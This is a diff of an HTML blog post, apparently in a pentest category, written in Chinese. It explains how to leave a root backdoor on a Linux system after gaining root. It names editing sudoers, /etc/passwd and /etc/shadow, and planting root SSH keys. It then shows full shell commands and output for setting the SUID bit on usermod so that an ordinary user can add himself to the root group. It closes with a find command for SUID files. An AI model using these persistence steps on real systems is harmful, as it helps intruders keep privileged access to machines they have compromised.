@@ -82,59 +82,46 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/backdoor">backdoor</a>)
 </div>
 
-      <div>
-
-<p>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制</p>
-
+      <div><p>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制</p>
 <h3 id="0x00-为二进制文件添加s权限从而提升为root权限">0x00 为二进制文件添加s权限从而提升为root权限</h3>
-
 <ul>
-<li>写sudoers添加用户  <code>//最佳方案</code><br /></li>
+<li>写sudoers添加用户  <code>//最佳方案</code></li>
 <li>vim /etc/passwd    <code>//将uid和gid改为0</code></li>
-<li>vim /etc/shadow    <code>//密文覆盖</code><br /></li>
+<li>vim /etc/shadow    <code>//密文覆盖</code></li>
 <li>vim root .ssh/证书文件   <code>.ssh这个文件夹和证书的权限要正确，要和原来一致</code></li>
 </ul>
-
 <h3 id="0x01-suid主要作用可以是留后门">0x01 SUID主要作用可以是留后门</h3>
-
 <ul>
-<li><p>在root权限下给usermod一个s权限</p>
-
-<pre><code class="language-bash"># which usermod   #得到usermod的路径                             
-/usr/sbin/usermod
-# chmod u+s /usr/sbin/usermod
-# ls -l /usr/sbin/usermod
--rwsr-x---. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
-</code></pre></li>
-
-<li><p>usermod给其他人一个x权限</p>
-
-<pre><code class="language-bash">[root@localhost ~]# chmod o+x /usr/sbin/usermod
-[root@localhost ~]# ls -l /usr/sbin/usermod
--rwsr-x--x. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
-</code></pre></li>
-
-<li><p>切换到普通用户wyb</p>
-
-<pre><code class="language-bash">[wyb@localhost ~]$ id wyb
-uid=500(wyb) gid=500(wyb) groups=500(wyb)
-[wyb@localhost ~]$ usermod -g root wyb
-[wyb@localhost ~]$ id wyb
-uid=500(wyb) gid=0(root) groups=0(root)
-[wyb@localhost ~]$ exit
-</code></pre></li>
-
-<li><p>验证</p>
-
-<pre><code class="language-bash">重新用wyb连接，此时即为root权限
-[wyb@localhost ~]$ cd /root  #若能切换到此目录即证明确实获得了root权限
-[wyb@localhost root]$ ls
-anaconda-ks.cfg  install.log  install.log.syslog
-</code></pre></li>
+<li>在root权限下给usermod一个s权限</li>
 </ul>
-
-<h3 id="0x02-查找拥有s权限的文件">0x02 查找拥有s权限的文件</h3>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># which usermod   #得到usermod的路径                             </span>
+</span></span><span style="display:flex;"><span>/usr/sbin/usermod
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># chmod u+s /usr/sbin/usermod</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls -l /usr/sbin/usermod</span>
+</span></span><span style="display:flex;"><span>-rwsr-x---. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">98680</span> Dec  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2011</span> /usr/sbin/usermod
+</span></span></code></pre></div><ul>
+<li>usermod给其他人一个x权限</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost ~<span style="color:#f92672">]</span><span style="color:#75715e"># chmod o+x /usr/sbin/usermod</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost ~<span style="color:#f92672">]</span><span style="color:#75715e"># ls -l /usr/sbin/usermod</span>
+</span></span><span style="display:flex;"><span>-rwsr-x--x. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">98680</span> Dec  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2011</span> /usr/sbin/usermod
+</span></span></code></pre></div><ul>
+<li>切换到普通用户wyb</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ id wyb
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>500<span style="color:#f92672">(</span>wyb<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>500<span style="color:#f92672">(</span>wyb<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>500<span style="color:#f92672">(</span>wyb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ usermod -g root wyb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ id wyb
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>500<span style="color:#f92672">(</span>wyb<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ exit
+</span></span></code></pre></div><ul>
+<li>验证</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>重新用wyb连接，此时即为root权限
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost ~<span style="color:#f92672">]</span>$ cd /root  <span style="color:#75715e">#若能切换到此目录即证明确实获得了root权限</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wyb@localhost root<span style="color:#f92672">]</span>$ ls
+</span></span><span style="display:flex;"><span>anaconda-ks.cfg  install.log  install.log.syslog
+</span></span></code></pre></div><h3 id="0x02-查找拥有s权限的文件">0x02 查找拥有s权限的文件</h3>
 <ul>
 <li>find / -perm -u=s -type f 2&gt;/dev/null</li>
 </ul>
